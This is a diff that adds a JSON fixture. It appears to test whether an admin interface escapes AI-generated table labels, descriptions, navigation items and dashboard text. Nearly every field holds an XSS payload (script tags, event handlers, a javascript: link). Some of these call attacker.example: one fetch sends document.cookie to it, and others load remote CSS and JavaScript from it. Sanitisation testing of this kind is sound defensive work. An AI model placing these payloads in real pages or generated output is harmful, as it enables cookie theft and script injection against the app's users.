@@ -1,0 +1,77 @@
+{
+  "schema_version": "adminium.llm/v1",
+  "run_id": "01J9ZK3W8E2Q4R6T8V0X2Y4Z6A",
+  "tables": [
+    {
+      "table": "public.orders",
+      "confidence": 0.91,
+      "label": { "en_US": "<img src=x onerror=\"fetch('https://attacker.example/?c='+document.cookie)\">Orders" },
+      "description": { "en_US": "</textarea></script><script>alert('desc')</script>Customer orders." },
+      "icon": "shopping-cart",
+      "displayColumn": null,
+      "naturalKey": null,
+      "pageTemplates": [
+        {
+          "template": "page-queue-inbox",
+          "rank": 1,
+          "triggers": ["<script>alert('trigger')</script>"],
+          "reason": "<b onmouseover=alert('reason')>Workflow status enum</b> suits a queue.",
+          "confidence": 0.8
+        }
+      ],
+      "microcopy": {
+        "emptyState": {
+          "headline": { "en_US": "<script>alert('headline')</script>No orders yet" },
+          "guidance": { "en_US": "<a href=\"javascript:alert('guidance')\">Create your first order</a> to get started." }
+        },
+        "pageSubtitle": { "en_US": "\"><svg onload=alert('subtitle')>Track and fulfil orders" }
+      },
+      "columns": [
+        {
+          "column": "order_number",
+          "label": { "en_US": "<iframe srcdoc=\"<script>alert('col')</script>\"></iframe>Order number" },
+          "description": { "en_US": "<style>@import url(https://attacker.example/x.css);</style>Human-readable order id." },
+          "pii": null
+        },
+        {
+          "column": "status",
+          "label": { "en_US": "Status<script src=https://attacker.example/x.js></script>" },
+          "pii": null
+        }
+      ]
+    }
+  ],
+  "navGroups": [
+    {
+      "id": "sales",
+      "label": { "en_US": "<marquee onstart=alert('nav')>Sales</marquee>" },
+      "icon": "shopping-cart",
+      "order": 0,
+      "tables": ["public.orders"],
+      "confidence": 0.88
+    }
+  ],
+  "dashboards": [
+    {
+      "id": "revenue",
+      "domain": "Revenue",
+      "label": { "en_US": "<svg/onload=alert('dash')>Revenue" },
+      "order": 0,
+      "tables": ["public.orders"],
+      "widgets": [
+        {
+          "widget": "kpi-stat-card",
+          "rank": 1,
+          "span": 3,
+          "table": "public.orders",
+          "metricColumn": "total_cents",
+          "agg": "sum",
+          "titleEn": "<img src=x onerror=alert('widget')>Revenue",
+          "reason": "<script>alert('wreason')</script>total_cents is the money measure.",
+          "confidence": 0.93
+        }
+      ]
+    }
+  ],
+  "notes": ["<script>alert('note')</script>Consider indexing placed_at."]
+}
